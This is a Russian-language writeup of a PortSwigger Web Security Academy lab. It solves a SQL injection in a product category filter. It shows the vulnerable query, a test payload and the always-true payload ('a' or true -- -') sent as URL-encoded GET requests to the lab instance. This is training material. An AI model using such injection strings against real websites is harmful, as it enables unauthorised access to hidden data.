---
title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/sql-injection-apprentice/sql-injection/lab-retrieve-hidden-data"
classes: wide
---

Эта лабораторная работа содержит уязвимость **SQL injection** в фильтре категорий продуктов. Когда пользователь выбирает категорию, приложение выполняет SQL-запрос, подобный следующему:

```
https://0ab900ec030c754b80e840ee008c0060.web-security-academy.net/
```

```sql
SELECT
	*
FROM
	products
WHERE
	category = 'Gifts' AND released = 1
```

Чтобы решить лабораторную задачу, нужно выполнить атаку с помощью `SQLi`, в результате которой приложение должно отобразить один или несколько невыпущенных продуктов.

## Solution

На странице вижу фильтр товаров:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/1.png){: height="200" .align-center}


При выборе какого либо из них меняется `URL`:

```
https://0ab900ec030c754b80e840ee008c0060.web-security-academy.net/filter?category=Accessories
```


Мне известно, что это `SQL`-инъекция, а значит нужно было бы подобрать обрамление запроса, но сам запрос у меня есть из условия лабы:

```sql
SELECT
	*
FROM
	products
WHERE
	category = 'Accessories' AND released = 1
```


Для обрамления используется одинарная кавычка, значит у нас должен сработать следующий вариант запроса:

```sql
SELECT
	*
FROM
	products
WHERE
	category = 'Accessories' and false-- - AND released = 1
```

При таком запросе мы должны получить пустую страницу. 


Для теста нам нужно передать значение `Accessories' and false-- -` через `GET`-запрос:

```
https://0ab900ec030c754b80e840ee008c0060.web-security-academy.net/filter?category=Accessories%27%20and%20false%20--%20-
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/2.png){: height="200" .align-center}


Для получения всех товаров передадим такое условие, которое всегда является истиным. Например `a' or true -- -`.

```
https://0ab900ec030c754b80e840ee008c0060.web-security-academy.net/filter?category=a%27%20or%20true%20--%20-
```

Мы получили весь список товаров)


До:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/3.png){: height="200" .align-center}


После:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data/4.png){: height="200" .align-center}


Лаба пройдена:3 ☕